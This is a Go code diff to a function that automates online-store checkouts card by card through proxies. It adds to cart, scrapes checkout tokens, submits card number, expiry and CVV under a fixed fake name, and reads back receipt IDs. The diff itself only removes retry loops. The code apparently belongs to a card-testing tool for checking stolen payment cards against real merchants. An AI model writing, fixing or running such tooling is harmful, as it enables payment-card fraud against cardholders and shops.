@@ -265,29 +265,17 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		return result, result.Error
 	}
 
-	var checkoutURL, checkoutToken, sessionToken, checkoutHTML string
-	stableID := ""
-	buildID := ""
-	sourceToken := ""
-	for step1Attempt := 0; step1Attempt < 3; step1Attempt++ {
-		checkoutURL, checkoutToken, sessionToken, checkoutHTML, err = addToCartAndCheckout(client, shopURL, variantID)
-		if err != nil {
-			result.Status = StatusError
-			result.Retryable = true
-			result.Error = fmt.Errorf("Step 1 failed: %w", err)
-			return result, result.Error
-		}
-		stableID = extractStableID(checkoutHTML)
-		buildID = extractCommitSha(checkoutHTML)
-		sourceToken = extractSourceToken(checkoutHTML)
-		if stableID != "" && buildID != "" && sourceToken != "" {
-			break
-		}
-		if step1Attempt < 2 {
-			fmt.Printf("  [WARN] Step1 retry %d: missing tokens, retrying shop=%s\n", step1Attempt+1, shopURL)
-			time.Sleep(500 * time.Millisecond)
-			continue
-		}
+	checkoutURL, checkoutToken, sessionToken, checkoutHTML, err := addToCartAndCheckout(client, shopURL, variantID)
+	if err != nil {
+		result.Status = StatusError
+		result.Retryable = true
+		result.Error = fmt.Errorf("Step 1 failed: %w", err)
+		return result, result.Error
+	}
+	stableID := extractStableID(checkoutHTML)
+	buildID := extractCommitSha(checkoutHTML)
+	sourceToken := extractSourceToken(checkoutHTML)
+	if stableID == "" || buildID == "" || sourceToken == "" {
 		saveDebugResponse("checkout_html_step1", checkoutHTML)
 		fmt.Printf("  [ERR] Step1 missing: stableID=%v buildID=%v sourceToken=%v shop=%s\n",
 			stableID != "", buildID != "", sourceToken != "", shopURL)
@@ -450,33 +438,23 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		return result, result.Error
 	}
 
-	var pciStatus int
-	var pciBody string
-	pciSessionID := ""
-	for step9Attempt := 0; step9Attempt < 3; step9Attempt++ {
-		pciStatus, pciBody, err = sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
-		if err != nil {
-			result.Status = StatusError
-			result.Retryable = true
-			result.Error = fmt.Errorf("Step 9 failed: %w", err)
-			return result, result.Error
-		}
-		saveDebugResponse("pci_session", pciBody)
-		pciSessionID = extractPCISessionID(pciBody)
-		if pciSessionID != "" {
-			break
-		}
-		if step9Attempt < 2 {
-			fmt.Printf("  [WARN] Step9 retry %d: missing session ID, retrying\n", step9Attempt+1)
-			time.Sleep(500 * time.Millisecond)
-			continue
-		}
+	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
+	_ = pciStatus
+	if err != nil {
+		result.Status = StatusError
+		result.Retryable = true
+		result.Error = fmt.Errorf("Step 9 failed: %w", err)
+		return result, result.Error
+	}
+	saveDebugResponse("pci_session", pciBody)
+
+	pciSessionID := extractPCISessionID(pciBody)
+	if pciSessionID == "" {
 		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 9 failed: could not extract session ID")
 		return result, result.Error
 	}
-	_ = pciStatus
 
 	queueToken5 := extractQueueToken(proposal5Body)
 	if queueToken5 == "" {
@@ -516,42 +494,32 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	}
 	result.Amount = totalAmount
 
-	var submitStatus int
-	var submitBody string
-	receiptID := ""
-	for step10Attempt := 0; step10Attempt < 3; step10Attempt++ {
-		attemptToken := generateAttemptToken(checkoutToken)
-		submitStatus, submitBody, err = sendSubmitForCompletion(
-			client, shopURL, checkoutURL, checkoutToken, sessionToken,
-			stableID, variantID, price,
-			submitID, buildID, sourceToken, queueToken5, email,
-			addr,
-			deliveryHandle, shippingAmount, totalAmount,
-			pciSessionID, attemptToken, currency, country,
-			signedHandles,
-		)
-		if err != nil {
-			result.Status = StatusError
-			result.Error = fmt.Errorf("Step 10 failed: %w", err)
-			return result, result.Error
-		}
-		saveDebugResponse("submit", submitBody)
-		checkSubmitErrors(submitStatus, submitBody)
-		receiptID = extractReceiptID(submitBody)
-		if receiptID != "" {
-			break
-		}
-		if step10Attempt < 2 {
-			fmt.Printf("  [WARN] Step10 retry %d: missing receiptId, retrying\n", step10Attempt+1)
-			time.Sleep(500 * time.Millisecond)
-			continue
-		}
+	attemptToken := generateAttemptToken(checkoutToken)
+	submitStatus, submitBody, err := sendSubmitForCompletion(
+		client, shopURL, checkoutURL, checkoutToken, sessionToken,
+		stableID, variantID, price,
+		submitID, buildID, sourceToken, queueToken5, email,
+		addr,
+		deliveryHandle, shippingAmount, totalAmount,
+		pciSessionID, attemptToken, currency, country,
+		signedHandles,
+	)
+	_ = submitStatus
+	if err != nil {
+		result.Status = StatusError
+		result.Error = fmt.Errorf("Step 10 failed: %w", err)
+		return result, result.Error
+	}
+	saveDebugResponse("submit", submitBody)
+	checkSubmitErrors(submitStatus, submitBody)
+
+	receiptID := extractReceiptID(submitBody)
+	if receiptID == "" {
 		result.Status = StatusError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract receiptId", errMissingReceiptID)
 		result.Retryable = true
 		return result, result.Error
 	}
-	_ = submitStatus
 	receiptSessionToken := extractReceiptSessionToken(submitBody)
 	if receiptSessionToken == "" {
 		result.Status = StatusError
